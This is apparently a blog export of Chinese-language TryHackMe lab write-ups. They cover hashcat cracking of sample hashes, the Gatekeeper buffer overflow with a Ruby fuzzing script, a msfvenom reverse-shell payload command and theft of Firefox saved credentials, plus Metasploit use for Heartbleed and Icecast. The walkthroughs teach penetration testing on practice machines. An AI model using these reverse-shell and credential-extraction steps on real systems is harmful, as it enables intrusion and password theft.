md5(md5($pass).md5($salt))</span><br><span class="line">[+] md5(md5($salt).$pass)</span><br><span class="line">[+] md5(md5($salt).md5($pass))</span><br><span class="line">[+] md5(md5($username.$pass).$salt)</span><br><span class="line">[+] md5(md5(md5($pass)))</span><br><span class="line">[+] md5(md5(md5(md5($pass))))</span><br><span class="line">[+] md5(md5(md5(md5(md5($pass)))))</span><br><span class="line">[+] md5(sha1($pass))</span><br><span class="line">[+] md5(sha1(md5($pass)))</span><br><span class="line">[+] md5(sha1(md5(sha1($pass))))</span><br><span class="line">[+] md5(strtoupper(md5($pass)))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 0 48bb6e862e54f2a795ffc4e541caed4d &#x2F;rockyou.txt --force</span><br><span class="line">48bb6e862e54f2a795ffc4e541caed4d:easy</span><br></pre></td></tr></table></figure>

<h2 id="2-SHA1"><a href="#2-SHA1" class="headerlink" title="2 SHA1"></a>2 SHA1</h2><p>hash-identifier:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> HASH: CBFDAC6008F9CAB4083784CBD1874F76618D2A97</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] SHA-1</span><br><span class="line">[+] MySQL5 - SHA-1(SHA-1($pass))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] Tiger-160</span><br><span class="line">[+] Haval-160</span><br><span class="line">[+] RipeMD-160</span><br><span class="line">[+] SHA-1(HMAC)</span><br><span class="line">[+] Tiger-160(HMAC)</span><br><span class="line">[+] RipeMD-160(HMAC)</span><br><span class="line">[+] Haval-160(HMAC)</span><br><span class="line">[+] SHA-1(MaNGOS)</span><br><span class="line">[+] SHA-1(MaNGOS2)</span><br><span class="line">[+] sha1($pass.$salt)</span><br><span class="line">[+] sha1($salt.$pass)</span><br><span class="line">[+] sha1($salt.md5($pass))</span><br><span class="line">[+] sha1($salt.md5($pass).$salt)</span><br><span class="line">[+] sha1($salt.sha1($pass))</span><br><span class="line">[+] sha1($salt.sha1($salt.sha1($pass)))</span><br><span class="line">[+] sha1($username.$pass)</span><br><span class="line">[+] sha1($username.$pass.$salt)</span><br><span class="line">[+] sha1(md5($pass))</span><br><span class="line">[+] sha1(md5($pass).$salt)</span><br><span class="line">[+] sha1(md5(sha1($pass)))</span><br><span class="line">[+] sha1(sha1($pass))</span><br><span class="line">[+] sha1(sha1($pass).$salt)</span><br><span class="line">[+] sha1(sha1($pass).substr($pass,0,3))</span><br><span class="line">[+] sha1(sha1($salt.$pass))</span><br><span class="line">[+] sha1(sha1(sha1($pass)))</span><br><span class="line">[+] sha1(strtolower($username).$pass)</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 100 CBFDAC6008F9CAB4083784CBD1874F76618D2A97 rockyou.txt --force</span><br><span class="line">cbfdac6008f9cab4083784cbd1874f76618d2a97:password123</span><br></pre></td></tr></table></figure>

<h2 id="3-SHA-256"><a href="#3-SHA-256" class="headerlink" title="3 SHA-256"></a>3 SHA-256</h2><p>hash-identifier:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> HASH: 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] SHA-256</span><br><span class="line">[+] Haval-256</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] GOST R 34.11-94</span><br><span class="line">[+] RipeMD-256</span><br><span class="line">[+] SNEFRU-256</span><br><span class="line">[+] SHA-256(HMAC)</span><br><span class="line">[+] Haval-256(HMAC)</span><br><span class="line">[+] RipeMD-256(HMAC)</span><br><span class="line">[+] SNEFRU-256(HMAC)</span><br><span class="line">[+] SHA-256(md5($pass))</span><br><span class="line">[+] SHA-256(sha1($pass))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 1400 1C8BFE8F801D79745C4631D09FFF36C82AA37FC4CCE4FC946683D7B336B63032 rockyou.txt --force</span><br><span class="line"></span><br><span class="line">1c8bfe8f801d79745c4631d09fff36c82aa37fc4cce4fc946683d7b336b63032:letmein</span><br></pre></td></tr></table></figure>



<h2 id="4-bcrypt"><a href="#4-bcrypt" class="headerlink" title="4 bcrypt"></a>4 bcrypt</h2><p>hash-identifier:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HASH: $2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom</span><br><span class="line"></span><br><span class="line">Not Found.</span><br></pre></td></tr></table></figure>

<p>经过google之后发现这是<code>bcrypt</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 3200 1.txt rockyou.txt --force                                                         </span><br><span class="line">$2y$12$Dwt1BZj6pcyc3Dy1FWZ5ieeUznr71EeNkJkUlypTsgbX1H68wsRom:bleh</span><br></pre></td></tr></table></figure>

<h2 id="5-MD4"><a href="#5-MD4" class="headerlink" title="5 MD4"></a>5 MD4</h2><p>hash-identifier:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> HASH: 279412f945939ba78ce0758d3fd83daa</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br><span class="line">[+] MD4</span><br><span class="line">[+] MD2</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200506_215641.jpg" alt="md4"></p>
<h1 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h1><h2 id="1-SHA-256"><a href="#1-SHA-256" class="headerlink" title="1 SHA-256"></a>1 SHA-256</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HASH: F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] SHA-256</span><br><span class="line">[+] Haval-256</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] GOST R 34.11-94</span><br><span class="line">[+] RipeMD-256</span><br><span class="line">[+] SNEFRU-256</span><br><span class="line">[+] SHA-256(HMAC)</span><br><span class="line">[+] Haval-256(HMAC)</span><br><span class="line">[+] RipeMD-256(HMAC)</span><br><span class="line">[+] SNEFRU-256(HMAC)</span><br><span class="line">[+] SHA-256(md5($pass))</span><br><span class="line">[+] SHA-256(sha1($pass))</span><br><span class="line">--------------------------------------------------</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 1400 F09EDCB1FCEFC6DFB23DC3505A882655FF77375ED8AA2D1C13F640FCCC2D0C85 &#x2F;rockyou.txt --force</span><br><span class="line"></span><br><span class="line">f09edcb1fcefc6dfb23dc3505a882655ff77375ed8aa2d1c13f640fccc2d0c85:paule</span><br></pre></td></tr></table></figure>

<h2 id="2-NTLM"><a href="#2-NTLM" class="headerlink" title="2 NTLM"></a>2 NTLM</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HASH: 1DFECA0C002AE40B8619ECF94819CC1B</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] MD5</span><br><span class="line">[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))</span><br><span class="line"></span><br><span class="line">Least Possible Hashs:</span><br><span class="line">[+] RAdmin v2.x</span><br><span class="line">[+] NTLM</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 1000 1DFECA0C002AE40B8619ECF94819CC1B rockyou.txt --force                               </span><br><span class="line">1dfeca0c002ae40b8619ecf94819cc1b:n63umy8lkf4i</span><br></pre></td></tr></table></figure>

<h2 id="3-Linux-sha512crypt"><a href="#3-Linux-sha512crypt" class="headerlink" title="3 Linux  sha512crypt"></a>3 Linux  sha512crypt</h2><p>hash-info</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hash: $6$aReallyHardSalt$6WKUTqzq.UQQmrm0p&#x2F;T7MPpMbGNnzXPMAXi4bJMl9be.cfi3&#x2F;qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.</span><br><span class="line"></span><br><span class="line">Salt: aReallyHardSalt</span><br><span class="line"></span><br><span class="line">Rounds: 5</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$hashcat -m 1800 1.hash &#x2F;rockyou.txt --force </span><br><span class="line">$6$aReallyHardSalt$6WKUTqzq.UQQmrm0p&#x2F;T7MPpMbGNnzXPMAXi4bJMl9be.cfi3&#x2F;qxIf.hsGpS41BqMhSrHVXgMpdjS6xeKZAs02.:waka99</span><br></pre></td></tr></table></figure>

<h2 id="4-HMAC-SHA1"><a href="#4-HMAC-SHA1" class="headerlink" title="4 HMAC-SHA1"></a>4 HMAC-SHA1</h2><p>看提示才知道的HMAC-SHA1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMAC-SHA1 (key &#x3D; $salt)</span><br><span class="line">e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 160 e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  --force</span><br><span class="line">e5d8870e5bdd26602cab8dbe07a942c8669e56d6:tryhackme:481616481616</span><br></pre></td></tr></table></figure>


<p>做了这几个练习之后,深刻的怀疑要不要再配部显卡强点的电脑来跑爆破….</p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>hashcat</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Gatekeeper</title>
    <url>/2020/07/11/TryHackMe-Gatekeeper/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>靶机在线链接：<a href="https://tryhackme.com/room/gatekeeper" target="_blank" rel="noopener">Gatekeeper</a></p>
<a id="more"></a>

<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Host is up (0.00050s latency).</span><br><span class="line">Not shown: 65524 closed ports</span><br><span class="line">PORT      STATE SERVICE            VERSION</span><br><span class="line">135&#x2F;tcp   open  msrpc              Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open  netbios-ssn        Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">3389&#x2F;tcp  open  ssl&#x2F;ms-wbt-server?</span><br><span class="line">|_ssl-date: 2020-07-03T17:01:47+00:00; -1s from scanner time.</span><br><span class="line">31337&#x2F;tcp open  Elite?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest: </span><br><span class="line">|     Hello GET &#x2F;nice%20ports%2C&#x2F;Tri%6Eity.txt%2ebak HTTP&#x2F;1.0</span><br><span class="line">|     Hello</span><br><span class="line">|   GenericLines: </span><br><span class="line">|     Hello </span><br><span class="line">|     Hello</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     Hello GET &#x2F; HTTP&#x2F;1.0</span><br><span class="line">|     Hello</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     Hello OPTIONS &#x2F; HTTP&#x2F;1.0</span><br><span class="line">|     Hello</span><br><span class="line">|   Help: </span><br><span class="line">|     Hello HELP</span><br><span class="line">|   Kerberos: </span><br><span class="line">|     Hello !!!</span><br><span class="line">|   LDAPSearchReq: </span><br><span class="line">|     Hello 0</span><br><span class="line">|     Hello</span><br><span class="line">|   LPDString: </span><br><span class="line">|     Hello </span><br><span class="line">|     default!!!</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     Hello OPTIONS &#x2F; RTSP&#x2F;1.0</span><br><span class="line">|     Hello</span><br><span class="line">|   SIPOptions: </span><br><span class="line">|     Hello OPTIONS sip:nm SIP&#x2F;2.0</span><br><span class="line">|     Hello Via: SIP&#x2F;2.0&#x2F;TCP nm;branch&#x3D;foo</span><br><span class="line">|     Hello From: &lt;sip:nm@nm&gt;;tag&#x3D;root</span><br><span class="line">|     Hello To: &lt;sip:nm2@nm2&gt;</span><br><span class="line">|     Hello Call-ID: 50000</span><br><span class="line">|     Hello CSeq: 42 OPTIONS</span><br><span class="line">|     Hello Max-Forwards: 70</span><br><span class="line">|     Hello Content-Length: 0</span><br><span class="line">|     Hello Contact: &lt;sip:nm@nm&gt;</span><br><span class="line">|     Hello Accept: application&#x2F;sdp</span><br><span class="line">|     Hello</span><br><span class="line">|   SSLSessionReq, TLSSessionReq, TerminalServerCookie: </span><br><span class="line">|_    Hello</span><br><span class="line">49152&#x2F;tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49153&#x2F;tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49154&#x2F;tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49160&#x2F;tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49161&#x2F;tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">49164&#x2F;tcp open  msrpc              Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port31337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;7&#x2F;3%Time&#x3D;5EFF63E0%P&#x3D;x86_64-pc-linux-gnu%r(Ge</span><br><span class="line">SF:tRequest,24,&quot;Hello\x20GET\x20&#x2F;\x20HTTP&#x2F;1\.0\r!!!\nHello\x20\r!!!\n&quot;)%r(</span><br><span class="line">SF:SIPOptions,142,&quot;Hello\x20OPTIONS\x20sip:nm\x20SIP&#x2F;2\.0\r!!!\nHello\x20V</span><br><span class="line">SF:ia:\x20SIP&#x2F;2\.0&#x2F;TCP\x20nm;branch&#x3D;foo\r!!!\nHello\x20From:\x20&lt;sip:nm@nm</span><br><span class="line">SF:&gt;;tag&#x3D;root\r!!!\nHello\x20To:\x20&lt;sip:nm2@nm2&gt;\r!!!\nHello\x20Call-ID:\</span><br><span class="line">SF:x2050000\r!!!\nHello\x20CSeq:\x2042\x20OPTIONS\r!!!\nHello\x20Max-Forwa</span><br><span class="line">SF:rds:\x2070\r!!!\nHello\x20Content-Length:\x200\r!!!\nHello\x20Contact:\</span><br><span class="line">SF:x20&lt;sip:nm@nm&gt;\r!!!\nHello\x20Accept:\x20application&#x2F;sdp\r!!!\nHello\x2</span><br><span class="line">SF:0\r!!!\n&quot;)%r(GenericLines,16,&quot;Hello\x20\r!!!\nHello\x20\r!!!\n&quot;)%r(HTTP</span><br><span class="line">SF:Options,28,&quot;Hello\x20OPTIONS\x20&#x2F;\x20HTTP&#x2F;1\.0\r!!!\nHello\x20\r!!!\n&quot;)</span><br><span class="line">SF:%r(RTSPRequest,28,&quot;Hello\x20OPTIONS\x20&#x2F;\x20RTSP&#x2F;1\.0\r!!!\nHello\x20\r</span><br><span class="line">SF:!!!\n&quot;)%r(Help,F,&quot;Hello\x20HELP\r!!!\n&quot;)%r(SSLSessionReq,C,&quot;Hello\x20\x</span><br><span class="line">SF:16\x03!!!\n&quot;)%r(TerminalServerCookie,B,&quot;Hello\x20\x03!!!\n&quot;)%r(TLSSessi</span><br><span class="line">SF:onReq,C,&quot;Hello\x20\x16\x03!!!\n&quot;)%r(Kerberos,A,&quot;Hello\x20!!!\n&quot;)%r(Four</span><br><span class="line">SF:OhFourRequest,47,&quot;Hello\x20GET\x20&#x2F;nice%20ports%2C&#x2F;Tri%6Eity\.txt%2ebak</span><br><span class="line">SF:\x20HTTP&#x2F;1\.0\r!!!\nHello\x20\r!!!\n&quot;)%r(LPDString,12,&quot;Hello\x20\x01def</span><br><span class="line">SF:ault!!!\n&quot;)%r(LDAPSearchReq,17,&quot;Hello\x200\x84!!!\nHello\x20\x01!!!\n&quot;);</span><br><span class="line">MAC Address: 02:38:CE:D7:E6:B6 (Unknown)</span><br><span class="line">Service Info: Host: GATEKEEPER; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 59m59s, deviation: 2h00m00s, median: -1s</span><br><span class="line">|_nbstat: NetBIOS name: GATEKEEPER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:38:ce:d7:e6:b6 (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)</span><br><span class="line">|   OS CPE: cpe:&#x2F;o:microsoft:windows_7::sp1:professional</span><br><span class="line">|   Computer name: gatekeeper</span><br><span class="line">|   NetBIOS computer name: GATEKEEPER\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2020-07-03T13:01:37-04:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-07-03T17:01:37</span><br><span class="line">|_  start_date: 2020-07-03T16:47:56</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br></pre></td></tr></table></figure>

<p>smb看看有没有东西</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient -L 10.10.26.76</span><br><span class="line">Enter WORKGROUP\kali&#39;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        Users           Disk      </span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure>

<p>尝试匿名连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;10.10.26.76&#x2F;C$ 需要密码</span><br><span class="line">smbclient &#x2F;&#x2F;10.10.26.76&#x2F;Users 允许匿名用户</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smb: \&gt; ls</span><br><span class="line">  .                                  DR        0  Fri May 15 09:57:08 2020</span><br><span class="line">  ..                                 DR        0  Fri May 15 09:57:08 2020</span><br><span class="line">  Default                           DHR        0  Tue Jul 14 15:07:31 2009</span><br><span class="line">  desktop.ini                       AHS      174  Tue Jul 14 12:54:24 2009</span><br><span class="line">  Share                               D        0  Fri May 15 09:58:07 2020</span><br><span class="line">cd </span><br><span class="line">                7863807 blocks of size 4096. 3870864 blocks available</span><br><span class="line">smb: \&gt; cd Share</span><br><span class="line">smb: \Share\&gt; ls</span><br><span class="line">  .                                   D        0  Fri May 15 09:58:07 2020</span><br><span class="line">  ..                                  D        0  Fri May 15 09:58:07 2020</span><br><span class="line">  gatekeeper.exe                      A    13312  Mon Apr 20 13:27:17 2020</span><br><span class="line"></span><br><span class="line">                7863807 blocks of size 4096. 3870864 blocks available</span><br><span class="line">smb: \Share\&gt; get gatekeeper.exe</span><br><span class="line">getting file \Share\gatekeeper.exe of size 13312 as gatekeeper.exe (3.6 KiloBytes&#x2F;sec) (average 3.6 KiloBytes&#x2F;sec)</span><br><span class="line">smb: \Share\&gt; exit</span><br></pre></td></tr></table></figure>

<h2 id="0x02-漏洞验证"><a href="#0x02-漏洞验证" class="headerlink" title="0x02 漏洞验证"></a>0x02 漏洞验证</h2><p>下载gatekeeper.exe之后，我将它放在了Windows 10 X64位上运行，并使用ImmunityDebugger进行调试。</p>
<p>简单的缓冲区溢出主要分为以下步骤</p>
<ol>
<li>模糊测试缓冲区溢出，知道输入多少个字符的时候会溢出。</li>
<li>用Pattern.rb生成第一步溢出获得的字符，并计算偏移量。</li>
<li>使用偏移量+4 看能不能手动的修改EIP的地址，如果能。那这4个字符就是EIP的值</li>
<li>测试ESP的大小</li>
<li>挑选出坏字符</li>
<li>JMP的值为\xff\xe4，使用mona看程序本身有没有保护机制，然后找到jmp的内存地址。</li>
<li>生成shellcode</li>
<li>用能溢出的字符+JMP的内存地址+无操作字符+shellcode 填入buffer</li>
<li>监听端口，运行脚本</li>
</ol>
<p>因为在<a href="https://atsud0.me/2020/06/25/Vulnhub-brainpan-1/">Vulnhub-brainpan-1</a>中写的已经很清楚了，和这个程序几乎一样。所以这里就不灌水了。</p>
<p>不过要注意：</p>
<ul>
<li>Python套接字接收不到程序回来的值，所以我最后使用ruby写的。（还是菜）</li>
</ul>
<p>给出第一步代码，接下来只需要不断修改buffer的值即可。</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'socket'</span>      <span class="comment"># Sockets 是标准库</span></span><br><span class="line"> </span><br><span class="line">hostname = <span class="string">'192.168.56.3'</span></span><br><span class="line">port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line">buffer = <span class="string">"A"</span>*<span class="number">200</span></span><br><span class="line">socket = TCPSocket.open(hostname,port)  <span class="comment"># 连接服务器</span></span><br><span class="line">socket.puts(buffer)  </span><br><span class="line"></span><br><span class="line">socket.close               <span class="comment"># 关闭 socket</span></span><br></pre></td></tr></table></figure>

<p>本地get_shell<br><img src="https://images.atsud0.me/images/post/Screenshot_20200711_005537.jpg" alt="get_shell"></p>
<h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>如果用python写的话，程序会先有一个保护机制。当输入一定的值后 这个保护机制才会失效，这个时候才是能够溢出的阶段。不过因为socket套接字的recv方法一直阻塞接收不到传回来的值，还是怎么的。我无法用python实现这个缓冲区溢出。如果你知道该怎么做，麻烦请告诉我，虚心学习。</p>
<h2 id="0x03漏洞利用"><a href="#0x03漏洞利用" class="headerlink" title="0x03漏洞利用"></a>0x03漏洞利用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=Your IP LPORT=1234 -b <span class="string">"\x00\x0a"</span> -f ruby</span><br></pre></td></tr></table></figure>



<p><img src="https://images.atsud0.me/images/post/image-20200905142823113.png" alt="image-20200905142823113"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200905143047746.png" alt="image-20200905143047746"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200905153239449.png" alt="image-20200905153239449"></p>
<p>啊。。有火狐，所以可以考虑火狐获取凭证。用msf比较方便，所以我重新反弹了一个msf的shell。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200905143223183.png" alt="image-20200905143223183"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200905153117498.png" alt="image-20200905153117498"></p>
<p>上面这些都试过了- -全部都要64位。但是目标机器是32位的。想到</p>
<p><img src="https://images.atsud0.me/images/post/image-20200905150035085.png" alt="image-20200905150035085"></p>
<p>导出之后，将这四个文件重命名会原来的名字</p>
<ul>
<li>cert9.db</li>
<li>cookies.sqlite</li>
<li>Key4.db</li>
<li>Logins.json</li>
</ul>
<p>然后再把C:\Users\natbat\AppData\Roamint\Mozilla\Firefox\Profiles文件夹也下载下来。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200905153606076.png" alt="image-20200905153606076"></p>
<p>最后有的文件，0 0自行忽略/tmp/下的其他的文件。再使用firefox解密的脚本</p>
<p><img src="https://images.atsud0.me/images/post/image-20200905153707946.png" alt="image-20200905153707946"></p>
<p><img src="https://images.atsud0.me/images/post/image-20200905152422670.png" alt="image-20200905152422670"></p>
<p>其实不使用msf自己把文件黏贴到samba的分享目录下也行。这四个文件都在Profiles下。</p>
<p><img src="https://images.atsud0.me/images/post/image-20200905153916141.png" alt="image-20200905153916141"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Buffer Overflow</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-HeartBleed</title>
    <url>/2020/05/17/TryHackMe-HeartBleed/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>在线靶场链接:<a href="https://tryhackme.com/room/heartbleed" target="_blank" rel="noopener">TryHackMe-HeartBleed</a></p>
<p>背景资料:<br><a href="http://heartbleed.com/" target="_blank" rel="noopener">HeartBleed</a><br><a href="https://www.seancassidy.me/diagnosis-of-the-openssl-heartbleed-bug.html" target="_blank" rel="noopener">OpenSSL-BUG</a><br><a href="https://stackabuse.com/heartbleed-bug-explained/" target="_blank" rel="noopener">Heartbleed-Bug-exp</a></p>
<p>弱点在于OpenSSL的实现，而不是SSL/TLS协议本身，所以除了OpenSSL之外的其他TLS实现方式都不受影响。</p>
<p>影响版本:<code>OpenSSL 1.0</code></p>
<p>编号:CVE-2014-0160</p>
<p>漏洞出现原因:缓冲区过读,没有对输入进行适当的验证(边界检查)</p>
<p>危害:</p>
<ul>
<li>服务器私钥被盗</li>
<li>用户会话cookie被盗</li>
<li>密码被盗</li>
</ul>
<p>影响:</p>
<ul>
<li>Linux基金会联合各大硅谷巨头成立核心基础架构联盟,为全球信息基础架构中的关键要素提供资金帮助.</li>
<li>Google成立了<a href="https://en.wikipedia.org/wiki/Project_Zero" title="" target="">Project Zero</a>.</li>
</ul>
<a id="more"></a>

<p>nmap -sV -p- –script vuln 0.0.0.0<br><img src="https://images.atsud0.me/images/post/Screenshot_20200512_102535.jpg" alt="nmap"></p>
<p>打开msf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search heartbleed</span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;ssl&#x2F;openssl_heartbleed</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/Screenshot_20200512_102752.jpg" alt="search-heartbleed"></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200512_102922.jpg" alt="options"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set rhost 0.0.0.0</span><br><span class="line">set verbose true</span><br></pre></td></tr></table></figure>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200512_103020.jpg" alt="get"></p>
]]></content>
      <categories>
        <category>靶机实验</category>
        <category>TryHackMe</category>
      </categories>
      <tags>
        <tag>Metasploit</tag>
        <tag>OpenSSL</tag>
      </tags>
  </entry>
  <entry>
    <title>TryHackMe-Ice</title>
    <url>/2020/04/24/TryHackMe-Ice/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><a href="https://tryhackme.com/room/ice" target="_blank" rel="noopener">ice</a><br>这是一个简单的靶机实验,涉及部分windows后渗透提权等指令</p>
<p>靶机难度:十分简单(适合初学者)</p>
<a id="more"></a>

<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>上来先扫一扫nmap端口</p>
<p><code>nmap -sS -T5 -vvv -sV -sC -p- 10.10.57.130</code></p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_105048.jpg" alt="nmap"></p>
<p>发现一个HTTP 8000端口<code>IceCast</code><br>去<a href="https://www.cvedetails.com/" target="_blank" rel="noopener">cvedetails</a>找找看有没有漏洞.</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_105525.jpg" alt="cve"></p>
<p>这个就是我们所利用的漏洞，可以看到这个漏洞的poc已经被MSF集成了<br><img src="https://images.atsud0.me/images/post/Screenshot_20200424_105602.jpg" alt="cve-2004-1561"></p>
<h1 id="漏洞利用-获得shell"><a href="#漏洞利用-获得shell" class="headerlink" title="漏洞利用-获得shell"></a>漏洞利用-获得shell</h1><p>打开<code>msfconsole</code>,搜索我们需要利用的poc，设置好rhosts后就可以<code>run</code>了</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_105906.jpg" alt="ice-poc"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>进去系统后，可以使用<code>sysinfo</code>收集信息，使用<code>run post/multi/recon/local_exploit_suggester</code>获得提权程序利用建议</p>
<p><img src="https://images.atsud0.me/images/post/Screenshot_20200424_102739.jpg" alt="提权建议程序"></p>
